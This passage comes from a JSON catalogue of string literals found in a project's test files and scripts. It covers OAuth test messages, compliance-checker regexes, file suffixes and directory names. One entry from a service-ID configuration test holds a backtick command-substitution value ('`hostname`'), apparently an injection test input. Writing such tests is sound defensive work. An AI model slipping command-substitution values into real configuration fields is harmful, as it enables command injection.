    "[TEST] Testing WebSocket Connectivity...": {
      "value": "[TEST] Testing WebSocket Connectivity...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:207"
      ]
    },
    "[TIMEOUT] Frontend tests timed out": {
      "value": "[TIMEOUT] Frontend tests timed out",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:63"
      ]
    },
    "[TIMEOUT] Iteration": {
      "value": "[TIMEOUT] Iteration",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:93"
      ]
    },
    "[TIMEOUT] Skipping remaining tests in": {
      "value": "[TIMEOUT] Skipping remaining tests in",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:90"
      ]
    },
    "[TIMEOUT] Test execution timed out": {
      "value": "[TIMEOUT] Test execution timed out",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:75"
      ]
    },
    "[TIMEOUT] Test timed out": {
      "value": "[TIMEOUT] Test timed out",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:71",
        "scripts/test_verify_workflow_status_corrected.py:70"
      ]
    },
    "[ULTRA-THINK] Performing deep semantic analysis...": {
      "value": "[ULTRA-THINK] Performing deep semantic analysis...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:42"
      ]
    },
    "[WARNING] Backend server is not running. Starting it...": {
      "value": "[WARNING] Backend server is not running. Starting it...",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:210"
      ]
    },
    "[WARNING] ClickHouse tests require running ClickHouse instance - these are integration tests": {
      "value": "[WARNING] ClickHouse tests require running ClickHouse instance - these are integration tests",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:23"
      ]
    },
    "[WARNING] Frontend dev server is not running. Starting it...": {
      "value": "[WARNING] Frontend dev server is not running. Starting it...",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:215"
      ]
    },
    "[WARNING] Significant test limit violations. Prioritize cleanup.": {
      "value": "[WARNING] Significant test limit violations. Prioritize cleanup.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:58"
      ]
    },
    "[WARNING] Some tests failed. Check the report for details.": {
      "value": "[WARNING] Some tests failed. Check the report for details.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:234"
      ]
    },
    "[WARNING] Some tests still failing - check individual test output above": {
      "value": "[WARNING] Some tests still failing - check individual test output above",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:87"
      ]
    },
    "[WARNING] Test file not found:": {
      "value": "[WARNING] Test file not found:",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:61",
        "scripts/startup_test_executor.py:132",
        "scripts/startup_test_executor.py:201"
      ]
    },
    "[WARNING] node_modules not found. Skipping frontend tests.": {
      "value": "[WARNING] node_modules not found. Skipping frontend tests.",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:23"
      ]
    },
    "[WARNING] npm not available. Skipping frontend tests.": {
      "value": "[WARNING] npm not available. Skipping frontend tests.",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:31"
      ]
    },
    "[WARN] Added function but test still fails": {
      "value": "[WARN] Added function but test still fails",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:331"
      ]
    },
    "[X]": {
      "value": "[X]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:440"
      ]
    },
    "[X] FILES EXCEEDING 300 LINES (": {
      "value": "[X] FILES EXCEEDING 300 LINES (",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:165"
      ]
    },
    "[X] FILES WITH FUNCTIONS > 8 LINES (": {
      "value": "[X] FILES WITH FUNCTIONS > 8 LINES (",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:173"
      ]
    },
    "[X] FILES WITH MOCK COMPONENTS (": {
      "value": "[X] FILES WITH MOCK COMPONENTS (",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:183"
      ]
    },
    "[^:]*:)": {
      "value": "[^:]*:)",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:64"
      ]
    },
    "[bold blue]Starting Local OAuth Testing[/bold blue]": {
      "value": "[bold blue]Starting Local OAuth Testing[/bold blue]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:436"
      ]
    },
    "[bold cyan]1. Checking Environment Configuration[/bold cyan]": {
      "value": "[bold cyan]1. Checking Environment Configuration[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:57"
      ]
    },
    "[bold cyan]2. Checking Service Health[/bold cyan]": {
      "value": "[bold cyan]2. Checking Service Health[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:99"
      ]
    },
    "[bold cyan]3. Testing OAuth Config Endpoint[/bold cyan]": {
      "value": "[bold cyan]3. Testing OAuth Config Endpoint[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:140"
      ]
    },
    "[bold cyan]4. Testing OAuth Login Initiation[/bold cyan]": {
      "value": "[bold cyan]4. Testing OAuth Login Initiation[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:181"
      ]
    },
    "[bold cyan]5. Testing Token Generation[/bold cyan]": {
      "value": "[bold cyan]5. Testing Token Generation[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:237"
      ]
    },
    "[bold cyan]6. Testing Token Validation[/bold cyan]": {
      "value": "[bold cyan]6. Testing Token Validation[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:297"
      ]
    },
    "[bold cyan]═══ OAuth Local Test Report ═══[/bold cyan]": {
      "value": "[bold cyan]═══ OAuth Local Test Report ═══[/bold cyan]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:346"
      ]
    },
    "[bold green]📋 Recommendations:[/bold green]": {
      "value": "[bold green]📋 Recommendations:[/bold green]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:391"
      ]
    },
    "[bold]Auth URL:[/bold]": {
      "value": "[bold]Auth URL:[/bold]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:151"
      ]
    },
    "[bold]Client ID:[/bold]": {
      "value": "[bold]Client ID:[/bold]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:152"
      ]
    },
    "[bold]Provider:[/bold]": {
      "value": "[bold]Provider:[/bold]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:151"
      ]
    },
    "[green]✓ Results exported to": {
      "value": "[green]✓ Results exported to",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:462"
      ]
    },
    "[green]✓[/green]": {
      "value": "[green]✓[/green]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:75",
        "scripts/test_oauth_local.py:359",
        "scripts/test_oauth_local.py:362",
        "scripts/test_oauth_local.py:365",
        "scripts/test_oauth_local.py:424"
      ]
    },
    "[green]✓[/green] All tests passed! OAuth is properly configured.": {
      "value": "[green]✓[/green] All tests passed! OAuth is properly configured.",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:426"
      ]
    },
    "[green]✓[/green] Config endpoint returned successfully": {
      "value": "[green]✓[/green] Config endpoint returned successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:147"
      ]
    },
    "[green]✓[/green] Correctly redirecting to auth service": {
      "value": "[green]✓[/green] Correctly redirecting to auth service",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:197"
      ]
    },
    "[green]✓[/green] Login endpoint redirects correctly": {
      "value": "[green]✓[/green] Login endpoint redirects correctly",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:192"
      ]
    },
    "[green]✓[/green] Token generated successfully": {
      "value": "[green]✓[/green] Token generated successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:253"
      ]
    },
    "[green]✓[/green] Token validated successfully": {
      "value": "[green]✓[/green] Token validated successfully",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:308"
      ]
    },
    "[red]Error during testing:": {
      "value": "[red]Error during testing:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:465"
      ]
    },
    "[red]✗[/red]": {
      "value": "[red]✗[/red]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:82",
        "scripts/test_oauth_local.py:368"
      ]
    },
    "[red]✗[/red] Config endpoint failed:": {
      "value": "[red]✗[/red] Config endpoint failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:165"
      ]
    },
    "[red]✗[/red] Dev login failed:": {
      "value": "[red]✗[/red] Dev login failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:272"
      ]
    },
    "[red]✗[/red] Error fetching config:": {
      "value": "[red]✗[/red] Error fetching config:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:173"
      ]
    },
    "[red]✗[/red] Error testing login flow:": {
      "value": "[red]✗[/red] Error testing login flow:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:225"
      ]
    },
    "[red]✗[/red] Error testing token generation:": {
      "value": "[red]✗[/red] Error testing token generation:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:281"
      ]
    },
    "[red]✗[/red] Error validating token:": {
      "value": "[red]✗[/red] Error validating token:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:334"
      ]
    },
    "[red]✗[/red] Login endpoint didn't redirect:": {
      "value": "[red]✗[/red] Login endpoint didn't redirect:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:211"
      ]
    },
    "[red]✗[/red] No token in response": {
      "value": "[red]✗[/red] No token in response",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:269"
      ]
    },
    "[red]✗[/red] Token validation failed:": {
      "value": "[red]✗[/red] Token validation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:321"
      ]
    },
    "[yellow]⊘[/yellow]": {
      "value": "[yellow]⊘[/yellow]",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:356"
      ]
    },
    "[yellow]⚠[/yellow] Dev login not enabled - skipping token generation test": {
      "value": "[yellow]⚠[/yellow] Dev login not enabled - skipping token generation test",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:287"
      ]
    },
    "[yellow]⚠[/yellow] Unexpected redirect location": {
      "value": "[yellow]⚠[/yellow] Unexpected redirect location",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:199"
      ]
    },
    "\\": {
      "value": "\\",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:173",
        "scripts/auto_fix_test_sizes.py:647",
        "scripts/auto_fix_test_violations.py:118",
        "scripts/business_value_test_index.py:148",
        "scripts/business_value_test_index.py:284",
        "scripts/business_value_test_index.py:353",
        "scripts/check_conftest_violations.py:55",
        "scripts/ci/check_test_stubs.py:95",
        "scripts/test_exclusion_check.py:49"
      ]
    },
    "\\.return_value\\s*=": {
      "value": "\\.return_value\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:275",
        "scripts/compliance/real_test_validator.py:236"
      ]
    },
    "\\.side_effect\\s*=": {
      "value": "\\.side_effect\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:275"
      ]
    },
    "\\1\\n    \\2": {
      "value": "\\1\\n    \\2",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:60",
        "scripts/batch_fix_and_test.py:30",
        "scripts/batch_fix_and_test.py:36",
        "scripts/simple_test_fix_loop.py:54"
      ]
    },
    "\\1def setup_method(self):\\n\\2\"\"\"Setup method for test class.\"\"\"\\n": {
      "value": "\\1def setup_method(self):\\n\\2\"\"\"Setup method for test class.\"\"\"\\n",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:23"
      ]
    },
    "\\[\\s*[\"\\']Part 1[\"\\']\\s*,\\s*[\"\\']Part 2[\"\\']\\s*,\\s*[\"\\']Part 3[\"\\']\\s*\\]": {
      "value": "\\[\\s*[\"\\']Part 1[\"\\']\\s*,\\s*[\"\\']Part 2[\"\\']\\s*,\\s*[\"\\']Part 3[\"\\']\\s*\\]",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:59"
      ]
    },
    "\\b(Mock|MagicMock|AsyncMock)\\(.*?\\)": {
      "value": "\\b(Mock|MagicMock|AsyncMock)\\(.*?\\)",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:113"
      ]
    },
    "\\n\\n\\n+": {
      "value": "\\n\\n\\n+",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:40"
      ]
    },
    "]": {
      "value": "]",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:392",
        "scripts/align_test_imports.py:394",
        "scripts/standardize_l3_test_names.py:273",
        "scripts/test_failure_scanner.py:240",
        "scripts/test_verify_workflow_status_corrected.py:202"
      ]
    },
    "] PID": {
      "value": "] PID",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:108",
        "scripts/cleanup_test_processes.py:166"
      ]
    },
    "] Processing:": {
      "value": "] Processing:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:304"
      ]
    },
    "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$": {
      "value": "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:29"
      ]
    },
    "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$": {
      "value": "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:22"
      ]
    },
    "^[a-zA-Z_]+:[a-zA-Z_]+$": {
      "value": "^[a-zA-Z_]+:[a-zA-Z_]+$",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:214"
      ]
    },
    "^\\s*(?:const|let|var)\\s+(\\w+)\\s*=\\s*(?:async\\s+)?(?:function|\\()": {
      "value": "^\\s*(?:const|let|var)\\s+(\\w+)\\s*=\\s*(?:async\\s+)?(?:function|\\()",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:32"
      ]
    },
    "^\\s*(?:export\\s+)?(?:async\\s+)?function\\s+(\\w+)": {
      "value": "^\\s*(?:export\\s+)?(?:async\\s+)?function\\s+(\\w+)",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:31"
      ]
    },
    "^\\s*(?:it|test|describe)\\s*\\([\\'\"`]([^\\'\"`]+)": {
      "value": "^\\s*(?:it|test|describe)\\s*\\([\\'\"`]([^\\'\"`]+)",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:34"
      ]
    },
    "^\\s*(\\w+)\\s*:\\s*(?:async\\s+)?(?:function|\\()": {
      "value": "^\\s*(\\w+)\\s*:\\s*(?:async\\s+)?(?:function|\\()",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:33"
      ]
    },
    "^\\s*(async\\s+)?def\\s+\\w+": {
      "value": "^\\s*(async\\s+)?def\\s+\\w+",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:264"
      ]
    },
    "^from \\. import": {
      "value": "^from \\. import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:133"
      ]
    },
    "^from \\.\\. import": {
      "value": "^from \\.\\. import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:120"
      ]
    },
    "^from helpers\\.": {
      "value": "^from helpers\\.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:75"
      ]
    },
    "_": {
      "value": "_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:161",
        "auth_service/tests/integration/test_auth_oauth_errors.py:479",
        "auth_service/tests/integration/test_auth_oauth_errors.py:479",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:761",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:948",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1336",
        "auth_service/tests/test_critical_oauth_environment_failures.py:415",
        "scripts/auto_fix_test_sizes.py:277",
        "scripts/auto_fix_test_sizes.py:328",
        "scripts/auto_fix_test_sizes.py:472"
      ]
    },
    "__": {
      "value": "__",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:95"
      ]
    },
    "__func__": {
      "value": "__func__",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:356",
        "auth_service/tests/test_auth_database_manager_missing_method.py:364"
      ]
    },
    "__init__": {
      "value": "__init__",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_service_integration_reliability.py:58",
        "auth_service/tests/test_auth_service_integration_reliability.py:91",
        "auth_service/tests/test_auth_service_integration_reliability.py:105",
        "auth_service/tests/test_auth_service_integration_reliability.py:117",
        "auth_service/tests/test_auth_service_integration_reliability.py:158"
      ]
    },
    "__init__.py": {
      "value": "__init__.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:113",
        "scripts/compliance/real_test_requirements_enforcer.py:140",
        "scripts/compliance/real_test_validator.py:70"
      ]
    },
    "__main__": {
      "value": "__main__",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:214",
        "auth_service/debug_db_test.py:74",
        "auth_service/test_actual_staging_credentials.py:182",
        "auth_service/test_staging_db_connection.py:328",
        "auth_service/test_url_construction.py:248",
        "auth_service/tests/integration/test_oauth_flows_sync.py:189",
        "auth_service/tests/test_auth_database_connection.py:81",
        "auth_service/tests/test_auth_startup_integration.py:273",
        "auth_service/tests/test_critical_staging_issues.py:262",
        "auth_service/tests/test_postgres_compliance.py:253"
      ]
    },
    "__pycache__": {
      "value": "__pycache__",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:78",
        "scripts/auto_fix_test_violations.py:103",
        "scripts/autonomous_review/test_reviewer.py:75",
        "scripts/autonomous_review/test_reviewer.py:194",
        "scripts/business_value_test_index.py:130",
        "scripts/check_conftest_violations.py:22",
        "scripts/compliance/project_test_validator.py:40",
        "scripts/compliance/real_test_requirements_enforcer.py:133",
        "scripts/compliance/test_size_validator.py:156",
        "scripts/fix_all_test_issues.py:16"
      ]
    },
    "__tests__": {
      "value": "__tests__",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:33",
        "scripts/autonomous_review/test_reviewer.py:202",
        "scripts/autonomous_review/test_reviewer.py:205",
        "scripts/autonomous_review/test_reviewer.py:321",
        "scripts/compliance/test_size_validator.py:130",
        "scripts/remove_test_stubs.py:78",
        "scripts/standardize_l3_test_names.py:60",
        "scripts/unified_test_config.py:181",
        "scripts/unified_test_runner.py:94"
      ]
    },
    "__tests__/auth": {
      "value": "__tests__/auth",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:35"
      ]
    },
    "__tests__/components": {
      "value": "__tests__/components",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:29",
        "scripts/test_frontend.py:31"
      ]
    },
    "__tests__/hooks": {
      "value": "__tests__/hooks",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:29",
        "scripts/test_frontend.py:32"
      ]
    },
    "__tests__/integration": {
      "value": "__tests__/integration",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:30"
      ]
    },
    "__tests__/integration/critical-integration.test.tsx": {
      "value": "__tests__/integration/critical-integration.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:37"
      ]
    },
    "__tests__/lib": {
      "value": "__tests__/lib",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:29"
      ]
    },
    "__tests__/services": {
      "value": "__tests__/services",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:29"
      ]
    },
    "__tests__/services/webSocketService.test.ts": {
      "value": "__tests__/services/webSocketService.test.ts",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:34"
      ]
    },
    "__tests__/store": {
      "value": "__tests__/store",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:29",
        "scripts/test_frontend.py:33"
      ]
    },
    "__tests__/system/startup.test.tsx": {
      "value": "__tests__/system/startup.test.tsx",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:37"
      ]
    },
    "__tests__/utils": {
      "value": "__tests__/utils",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:29"
      ]
    },
    "_assertions() - Common assertions": {
      "value": "_assertions() - Common assertions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:219"
      ]
    },
    "_basic(self):\n        \"\"\"Test basic functionality of": {
      "value": "_basic(self):\n        \"\"\"Test basic functionality of",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:152"
      ]
    },
    "_comprehensive": {
      "value": "_comprehensive",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:102"
      ]
    },
    "_convert_sslmode_to_ssl": {
      "value": "_convert_sslmode_to_ssl",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:64"
      ]
    },
    "_core.py": {
      "value": "_core.py",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:419"
      ]
    },
    "_critical": {
      "value": "_critical",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:100"
      ]
    },
    "_current_file_path": {
      "value": "_current_file_path",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:352"
      ]
    },
    "_e2e.py": {
      "value": "_e2e.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:372"
      ]
    },
    "_edge_cases(self):\n        \"\"\"Test edge cases for": {
      "value": "_edge_cases(self):\n        \"\"\"Test edge cases for",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:165"
      ]
    },
    "_error_handling(self):\n        \"\"\"Test error handling in": {
      "value": "_error_handling(self):\n        \"\"\"Test error handling in",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:175"
      ]
    },
    "_expired": {
      "value": "_expired",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:101"
      ]
    },
    "_extended.py": {
      "value": "_extended.py",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:426"
      ]
    },
    "_feature1.py": {
      "value": "_feature1.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:387"
      ]
    },
    "_feature2.py": {
      "value": "_feature2.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:388"
      ]
    },
    "_fixtures.py": {
      "value": "_fixtures.py",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:273",
        "scripts/compliance/test_refactor_helper.py:432"
      ]
    },
    "_functions.py": {
      "value": "_functions.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:472"
      ]
    },
    "_future": {
      "value": "_future",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:252"
      ]
    },
    "_get_base_auth_url": {
      "value": "_get_base_auth_url",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:58"
      ]
    },
    "_helper": {
      "value": "_helper",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:206"
      ]
    },
    "_helper_": {
      "value": "_helper_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:284"
      ]
    },
    "_helpers.py": {
      "value": "_helpers.py",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:275",
        "scripts/compliance/test_limits_checker.py:202",
        "scripts/compliance/test_size_validator.py:383"
      ]
    },
    "_integration.py": {
      "value": "_integration.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:201",
        "scripts/compliance/test_size_validator.py:371"
      ]
    },
    "_integration_": {
      "value": "_integration_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:343"
      ]
    },
    "_l3": {
      "value": "_l3",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:98"
      ]
    },
    "_l3.py": {
      "value": "_l3.py",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:30"
      ]
    },
    "_latency_avg": {
      "value": "_latency_avg",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:106",
        "scripts/real_service_test_metrics.py:161"
      ]
    },
    "_latency_p95": {
      "value": "_latency_p95",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:107"
      ]
    },
    "_load_from_secret_manager": {
      "value": "_load_from_secret_manager",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:237"
      ]
    },
    "_part": {
      "value": "_part",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:182",
        "scripts/fix_all_test_issues.py:198"
      ]
    },
    "_part_": {
      "value": "_part_",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:472"
      ]
    },
    "_real": {
      "value": "_real",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:44"
      ]
    },
    "_scenario_1() - First test case": {
      "value": "_scenario_1() - First test case",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:217"
      ]
    },
    "_scenario_2() - Second test case": {
      "value": "_scenario_2() - Second test case",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:218"
      ]
    },
    "_setup() - Test setup logic": {
      "value": "_setup() - Test setup logic",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:216"
      ]
    },
    "_test": {
      "value": "_test",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:116",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:121",
        "scripts/compliance/real_test_linter.py:237",
        "scripts/remove_test_stubs.py:99"
      ]
    },
    "_test.py": {
      "value": "_test.py",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:89",
        "scripts/autonomous_review/test_reviewer.py:308",
        "scripts/business_value_test_index.py:184",
        "scripts/compliance/project_test_validator.py:121",
        "scripts/compliance/test_size_validator.py:163"
      ]
    },
    "_test_": {
      "value": "_test_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:121"
      ]
    },
    "_tests": {
      "value": "_tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:309"
      ]
    },
    "_unit.py": {
      "value": "_unit.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:200",
        "scripts/compliance/test_size_validator.py:370"
      ]
    },
    "_user_": {
      "value": "_user_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:82"
      ]
    },
    "_utilities.py": {
      "value": "_utilities.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:570"
      ]
    },
    "_utils.py": {
      "value": "_utils.py",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:383",
        "scripts/auto_fix_test_violations.py:457"
      ]
    },
    "_wrong_issuer": {
      "value": "_wrong_issuer",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:175"
      ]
    },
    "`": {
      "value": "`",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:56",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:116",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:318",
        "scripts/analyze_test_overlap.py:591",
        "scripts/analyze_test_overlap.py:592",
        "scripts/analyze_test_overlap.py:606",
        "scripts/analyze_test_overlap.py:607",
        "scripts/auto_fix_test_violations.py:885"
      ]
    },
    "` (similarity:": {
      "value": "` (similarity:",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:578"
      ]
    },
    "` ↔ `": {
      "value": "` ↔ `",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:578"
      ]
    },
    "```": {
      "value": "```",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:533",
        "scripts/compliance/real_test_requirements_enforcer.py:535",
        "scripts/test_verify_workflow_status.py:187",
        "scripts/test_verify_workflow_status.py:190"
      ]
    },
    "`hostname`": {
      "value": "`hostname`",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:94"
      ]
    },
    "a": {
      "value": "a",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:88",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1162",
        "auth_service/tests/test_critical_oauth_environment_failures.py:299",
        "auth_service/tests/test_critical_service_id_configuration_failures.py:336",
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:307",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:32",
        "auth_service/tests/unit/test_oauth_pkce_validation.py:97",
